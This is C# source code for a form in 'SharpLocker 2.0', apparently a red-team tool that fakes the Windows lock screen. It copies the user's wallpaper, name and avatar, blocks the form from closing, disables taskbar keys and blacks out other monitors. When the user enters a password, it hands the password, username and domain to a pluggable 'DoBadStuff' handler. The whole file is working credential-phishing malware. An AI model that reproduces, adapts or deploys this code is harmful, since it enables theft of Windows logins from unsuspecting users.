using SharpLocker_2._0.Classes;
using System;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SharpLocker_2._0
{
    public partial class WindowsLogin : Form
    {
        private bool DenyClose { get; set; }
        private Interfaces.IDoBadStuff DoBadStuff;

        private const string PLACEHOLDER_TEXT = "Password";

        public WindowsLogin()
        {
            InitializeComponent();
            Initialize();
        }

        #region "Lock"

        private void WindowsLogin_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = DenyClose;
        }

        protected override CreateParams CreateParams
        {
            get
            {
                var parms = base.CreateParams;
                parms.Style &= ~0x02000000;
                parms.ExStyle |= 0x02000000;
                return parms;
            }
        }


        #endregion

        private void LoginButton_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(PasswordTextBox.Text)) return;
            if (PasswordTextBox.Text == PLACEHOLDER_TEXT) return;

            DenyClose = false;
            KeyPressHandler.Enable();

            DoBadStuff.Now(PasswordTextBox.Text, Environment.UserName, Environment.UserDomainName);

            Close();
        }

        #region "Password"

        private void PasswordTextBox_KeyDown(object sender, KeyEventArgs e)
        {
            CapsLockLabel.Visible = Control.IsKeyLocked(Keys.CapsLock);
            if (e.KeyCode == Keys.Enter) LoginButton.PerformClick();

            if (PasswordTextBox.Text == PLACEHOLDER_TEXT)
            {
                if (e.KeyCode == Keys.Right || e.KeyCode == Keys.Left)
                {
                    PasswordTextBox.Select(0, 0);
                    e.Handled = true;
                }
            }
        }

        private void PasswordTextBox_TextChanged(object sender, EventArgs e)
        {
            TextBox tb = (TextBox)sender;

            if (string.IsNullOrEmpty(tb.Text))
            {
                SetPlaceholder();
            }

            if (tb.Text.Substring(1, tb.Text.Length - 1) == PLACEHOLDER_TEXT)
            {
                tb.UseSystemPasswordChar = true;
                tb.Font = new Font("Microsoft Sans Serif", 23.25f);
                tb.Text = tb.Text.Substring(tb.Text.Length - 1);
                tb.ForeColor = SystemColors.WindowFrame;
                tb.Select(1, 0);
            }
        }

        private void PasswordTextBox_Click(object sender, EventArgs e)
        {
            if (PasswordTextBox.Text == PLACEHOLDER_TEXT) PasswordTextBox.Select(0, 0);
        }

        private void SetPlaceholder()
        {
            PasswordTextBox.UseSystemPasswordChar = false;
            PasswordTextBox.Text = PLACEHOLDER_TEXT;
            PasswordTextBox.Font = new Font("Microsoft Tai Le", 21.00f);
            PasswordTextBox.ForeColor = SystemColors.ControlLight;
            PasswordTextBox.Select(0, 0);
        }

        #endregion

        #region "Init"

        private void WindowsLogin_Load(object sender, EventArgs e)
        {
            BlurBackground();
            PasswordTextBox.Focus();
        }

        private void Initialize()
        {
            InitializeMisc();
            InitializePasswordTextbox();
            InitializeTaskbar();
            InitializeUserLabel();
            InitializeUserIcon();
            InitializeBackground();
            InitializeBadStuff();
            InitializeOtherScreens();
        }

        private void InitializeMisc()
        {
            DenyClose = true;
            CapsLockLabel.Visible = false;
        }

        private void InitializePasswordTextbox()
        {
            SetPlaceholder();
        }

        private void InitializeBadStuff()
        {
            DoBadStuff = new Interfaces.BadStuffLoader().Get();

            if (DoBadStuff == null) DoBadStuff = new DefaultBadStuff();
        }

        private void InitializeTaskbar()
        {
            KeyPressHandler.Disable();
        }

        private void InitializeUserLabel()
        {
            try
            {
                UserNameLabel.Text = System.DirectoryServices.AccountManagement.UserPrincipal.Current.DisplayName;
            }
            catch
            {
                UserNameLabel.Text = Environment.UserName;
            }
        }

        private Bitmap GetBackgroundImage() => new Bitmap(@Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Microsoft\\Windows\\Themes\\TranscodedWallpaper"));

        private void InitializeBackground() => BackgroundImage = GetBackgroundImage();

        private void BlurBackground()
        {
            GaussianBlur blur = new GaussianBlur(GetBackgroundImage());
            BackgroundImage = blur.Process(2);
        }

        private void InitializeUserIcon()
        {
            UserIconPictureBox.Image = GetUserIconFromPath("bmp");

            if (UserIconPictureBox.Image is null)
                UserIconPictureBox.Image = GetUserIconFromPath("png");

            if (UserIconPictureBox.Image is null)
                UserIconPictureBox.Image = GetUserIconFromPath("jpg");

            if (UserIconPictureBox.Image is null)
                UserIconPictureBox.Image = Properties.Resources.defaultAvatar;

            System.Drawing.Drawing2D.GraphicsPath gp = new System.Drawing.Drawing2D.GraphicsPath();
            gp.AddEllipse(0, 0, UserIconPictureBox.Width - 3, UserIconPictureBox.Height - 3);
            Region rg = new Region(gp);
            UserIconPictureBox.Region = rg;
        }

        private Image GetUserIconFromPath(string fileEnding)
        {
            try
            {
                foreach (string f in Directory.GetFiles(Path.GetTempPath()))
                {
                    if (!f.EndsWith($".{fileEnding}")) continue;
                    if (!f.Contains(Environment.UserName)) continue;
                    return Image.FromFile(f);
                }

                return null;
            }
            catch
            {
                return Properties.Resources.defaultAvatar;
            }
        }

        private void InitializeOtherScreens()
        {
            foreach (Screen screen in Screen.AllScreens.Where(x => !x.Primary))
            {
                new Task(() => BlackScreen(screen)).Start();
            }
        }

        private void BlackScreen(Screen screen)
        {
            Form blackForm = new Form()
            {
                Location = new Point(screen.WorkingArea.Left, screen.WorkingArea.Top),
                WindowState = FormWindowState.Maximized,
                StartPosition = FormStartPosition.Manual,
                FormBorderStyle = FormBorderStyle.None,
                BackColor = Color.Black,
                TopMost = true
            };

            blackForm.FormClosing += WindowsLogin_FormClosing;

            blackForm.ShowDialog();
        }

        private void WindowsLogin_Paint(object sender, PaintEventArgs e)
        {
            int offset = 1;
            e.Graphics.DrawRectangle(new Pen(LoginButton.FlatAppearance.BorderColor), new Rectangle(
                PasswordTextBox.Location.X - offset,
                PasswordTextBox.Location.Y - offset,
                PasswordTextBox.Width + offset,
                PasswordTextBox.Height + offset));
        }

        #endregion

    }
}
